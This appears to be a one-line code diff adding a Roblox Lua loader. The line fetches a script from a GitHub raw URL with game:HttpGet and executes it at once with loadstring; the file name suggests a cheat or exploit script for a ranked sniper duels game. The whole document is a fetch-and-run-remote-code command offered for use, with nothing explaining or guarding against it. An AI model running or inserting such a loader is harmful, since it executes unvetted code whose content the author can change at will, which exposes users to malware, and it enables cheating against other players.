@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/ranked-sniper-duels-spam2-cs3pdm73jmzfyr.lua"))()
